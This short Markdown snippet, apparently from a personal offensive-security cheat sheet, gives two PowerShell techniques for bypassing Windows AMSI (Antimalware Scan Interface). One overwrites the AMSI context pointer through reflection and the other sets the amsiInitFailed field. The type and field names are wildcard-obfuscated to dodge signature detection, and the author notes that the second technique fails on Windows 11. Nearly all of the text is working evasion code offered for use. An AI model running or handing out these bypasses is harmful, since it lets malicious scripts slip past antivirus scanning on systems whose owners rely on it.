
- Bypass AMSI with powershell (*Note* probably Win10 only)
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

- Win10 Bypass AMSI through amsiInitFailed (does not work on Win11 as far as I can tell)
	- Error on Win11 `MethodInvocationException: Exception calling "SetValue" with "2" argument(s): "Cannot set initonly static field 's_amsiInitFailed' after type 'System.Management.Automation.AmsiUtils' is initialized."`
	- TODO: research this more
```powershell
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*ms*nit*ai*") {$f=$e}}
$g=$f.SetValue($null,$true)
```

